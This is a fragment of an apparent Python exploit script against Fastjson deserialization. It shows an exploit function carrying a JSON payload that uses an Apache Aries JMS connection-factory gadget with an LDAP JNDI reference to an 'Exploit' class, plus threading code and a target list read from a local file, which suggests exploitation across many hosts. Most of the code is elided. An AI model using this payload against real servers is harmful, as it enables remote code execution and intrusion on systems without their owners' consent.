...
def exploit(ip_, index):
    try:
        ...
        payload={"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": True, "transactionManager": {"$ref":"$.transactionManager"}}
...
threads = []
with open(r'D:\Downloads\tmp\fastjson.txt', 'r') as file:
